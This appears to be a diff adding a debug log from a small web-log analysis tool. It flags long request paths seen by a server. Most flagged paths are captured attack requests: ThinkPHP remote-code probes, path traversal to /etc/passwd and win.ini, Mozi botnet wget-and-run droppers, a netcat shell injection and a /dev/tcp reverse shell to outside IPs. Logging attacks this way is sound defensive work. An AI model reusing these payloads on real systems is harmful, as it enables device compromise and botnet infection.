@@ -1,0 +1,87 @@
+INFO:root:Program has started executing
+INFO:root:Reading from standard input has started
+INFO:root:All data was read successfully
+INFO:root:Printing summary
+INFO:root:Printing summary was successful
+INFO:root:Program has finished executing
+INFO:root:Program has started executing
+INFO:root:Reading from standard input has started
+INFO:root:All data was read successfully
+INFO:root:Printing summary
+INFO:root:Printing summary was successful
+INFO:root:Program has finished executing
+INFO:root:Program has started executing
+INFO:root:Reading from standard input has started
+DEBUG:root:/?fbclid=IwAR1vuA_zUNQ52gum3TwdrWJJ7TxnxEIlbNSUyBuxNZ-wEz3iwYG2fTUdLjc is a suspiciously long pathname
+DEBUG:root:/?fbclid=IwAR1vuA_zUNQ52gum3TwdrWJJ7TxnxEIlbNSUyBuxNZ-wEz3iwYG2fTUdLjc is a suspiciously long pathname
+DEBUG:root:/author/wojtek/avatar_hud036d9cf2ed8f7cb12e1641e1312748f_40742_250x250_fill_q90_lanczos_center.jpg is a suspiciously long pathname
+DEBUG:root:/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP is a suspiciously long pathname
+DEBUG:root:/author/wojtek/avatar_hud036d9cf2ed8f7cb12e1641e1312748f_40742_250x250_fill_q90_lanczos_center.jpg is a suspiciously long pathname
+DEBUG:root:/dvrcontrol.cgi?nc${IFS}185.39.11.105${IFS}37373${IFS}-e${IFS}sh${IFS} is a suspiciously long pathname
+DEBUG:root:/shell?cd+/tmp;rm+-rf+*;wget+http://60.25.34.213:49239/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws is a suspiciously long pathname
+DEBUG:root:/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP is a suspiciously long pathname
+DEBUG:root:/?cat=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&dir=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&action=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&board=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&date=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&detail=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&download=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&folder=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&prefix=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&include=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&inc=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&locate=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&show=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&doc=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&site=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&type=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&view=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&content=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&document=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&layout=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&mod=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&conf=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd is a suspiciously long pathname
+DEBUG:root:/?cat=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&dir=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&action=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&board=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&date=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&detail=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&download=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&folder=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&prefix=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&include=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&inc=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&locate=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&show=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&doc=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&site=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&type=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&view=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&content=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&document=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&layout=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&mod=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&conf=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini is a suspiciously long pathname
+DEBUG:root:/nette.micro?callback=shell_exec&cmd=bash%20-i%20>&%20/dev/tcp/45.147.201.186/87890>&1 is a suspiciously long pathname
+DEBUG:root:/nette.micro?callback=shell_exec&cmd=bash%20-i%20>&%20/dev/tcp/45.147.201.186/87890>&1 is a suspiciously long pathname
+DEBUG:root:/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 is a suspiciously long pathname
+DEBUG:root:/author/wojtek/avatar_hud036d9cf2ed8f7cb12e1641e1312748f_40742_250x250_fill_q90_lanczos_center.jpg is a suspiciously long pathname
+DEBUG:root:/author/wojtek/avatar_hud036d9cf2ed8f7cb12e1641e1312748f_40742_250x250_fill_q90_lanczos_center.jpg is a suspiciously long pathname
+DEBUG:root:/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP is a suspiciously long pathname
+DEBUG:root:/login.cgi?cli=aa%20aa%27;wget%20http://download.nadns.info/cross.sh%20-O%20-%3E%20/tmp/cross.sh;sh%20/tmp/cross.sh%27$ is a suspiciously long pathname
+DEBUG:root:/author/wojtek/avatar_hud036d9cf2ed8f7cb12e1641e1312748f_40742_250x250_fill_q90_lanczos_center.jpg is a suspiciously long pathname
+DEBUG:root:/author/wojtek/avatar_hud036d9cf2ed8f7cb12e1641e1312748f_40742_250x250_fill_q90_lanczos_center.jpg is a suspiciously long pathname
+DEBUG:root:/author/wojtek/avatar_hud036d9cf2ed8f7cb12e1641e1312748f_40742_250x250_fill_q90_lanczos_center.jpg is a suspiciously long pathname
+DEBUG:root:/login.cgi?cli=aa%20aa%27;wget%20http://download.nadns.info/cross.sh%20-O%20-%3E%20/tmp/cross.sh;sh%20/tmp/cross.sh%27$ is a suspiciously long pathname
+DEBUG:root:/index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50 is a suspiciously long pathname
+DEBUG:root:/elrekt.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50 is a suspiciously long pathname
+DEBUG:root:/%73%65%65%79%6F%6E/%68%74%6D%6C%6F%66%66%69%63%65%73%65%72%76%6C%65%74 is a suspiciously long pathname
+DEBUG:root:/shell?cd+/tmp;rm+-rf+*;wget+http://123.14.37.96:35056/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws is a suspiciously long pathname
+DEBUG:root:/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP is a suspiciously long pathname
+DEBUG:root:/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.63.136.193:34347/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 is a suspiciously long pathname
+DEBUG:root:/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://31.146.115.35:51331/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 is a suspiciously long pathname
+DEBUG:root:/login.cgi?cli=aa%20aa%27;wget%20http://download.nadns.info/cross.sh%20-O%20-%3E%20/tmp/cross.sh;sh%20/tmp/cross.sh%27$ is a suspiciously long pathname
+DEBUG:root:/author/wojtek/avatar_hud036d9cf2ed8f7cb12e1641e1312748f_40742_250x250_fill_q90_lanczos_center.jpg is a suspiciously long pathname
+DEBUG:root:/shell?cd+/tmp;rm+-rf+*;wget+http://27.197.150.72:35617/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws is a suspiciously long pathname
+DEBUG:root:/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP is a suspiciously long pathname
+DEBUG:root:/author/wojtek/avatar_hud036d9cf2ed8f7cb12e1641e1312748f_40742_250x250_fill_q90_lanczos_center.jpg is a suspiciously long pathname
+DEBUG:root:/shell?cd+/tmp;rm+-rf+*;wget+http://182.116.103.23:45556/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws is a suspiciously long pathname
+DEBUG:root:/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP is a suspiciously long pathname
+DEBUG:root:/shell?cd+/tmp;rm+-rf+*;wget+http://117.213.42.29:52480/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws is a suspiciously long pathname
+INFO:root:All data was read successfully
+INFO:root:Printing summary
+DEBUG:root:print_summary input data has 5 arguments
+INFO:root:Printing summary was successful
+INFO:root:Program has finished executing
+INFO:root:Program has started executing
+INFO:root:Reading from standard input has started
+INFO:root:Program has started executing
+INFO:root:Reading from standard input has started
+INFO:root:Program has started executing
+INFO:root:Reading from standard input has started
+INFO:root:Program has started executing
+INFO:root:Reading from standard input has started
+INFO:root:Program has started executing
+INFO:root:Reading from standard input has started
+INFO:root:Program has started executing
+INFO:root:Reading from standard input has started
+INFO:root:Program has started executing
+INFO:root:Reading from standard input has started
+INFO:root:Program has started executing
+INFO:root:Reading from standard input has started
+INFO:root:All data was read successfully
+INFO:root:Printing summary
+INFO:root:Program has started executing
+INFO:root:Reading from standard input has started
+INFO:root:All data was read successfully
+INFO:root:Printing summary
+INFO:root:Program has started executing
+INFO:root:Reading from standard input has started
+INFO:root:All data was read successfully
+INFO:root:Printing summary
+INFO:root:Program has started executing
+INFO:root:Reading from standard input has started
+INFO:root:All data was read successfully
+INFO:root:Printing summary
+INFO:root:Printing summary was successful
+INFO:root:Program has finished executing
